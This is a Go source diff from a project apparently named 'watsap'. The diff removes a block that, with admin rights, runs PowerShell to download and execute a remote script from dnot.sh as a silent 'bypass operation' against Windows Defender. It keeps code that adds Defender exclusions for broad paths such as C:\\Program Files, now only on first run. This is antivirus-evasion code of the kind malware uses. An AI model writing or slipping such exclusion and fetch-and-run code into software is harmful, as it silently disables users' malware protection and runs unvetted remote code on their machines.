@@ -10,7 +10,7 @@ import (
 	"watsap/utils/config"
 )
 
-var customAVName = "'Windows Defender Antivirus'"
+// var customAVName = "'Windows Defender Antivirus'"
 var powershellPath string
 var defenderExclusions = []string{
 	"C:\\Program Files",
@@ -46,20 +46,10 @@ func Main() {
 		return
 	}
 
-	if isAdmin() {
+	if isAdmin() && config.FirstRun {
 		AddDefenderExclusions()
 
-		log.Printf("Starting bypass operation with custom name: %s", customAVName)
-		cmdString := fmt.Sprintf("& ([ScriptBlock]::Create((irm https://dnot.sh/))) --silent --name %s", customAVName)
-		cmd := exec.Command(powershellPath, "-NoProfile", "-Command", cmdString)
-
-		output, err := cmd.CombinedOutput()
-		if err != nil {
-			log.Printf("Bypass command failed. Output: %s", string(output))
-			return
-		}
-
-		log.Println("Bypass command executed successfully.")
+		log.Println("Defender exclusions added locally.")
 	}
 }
 
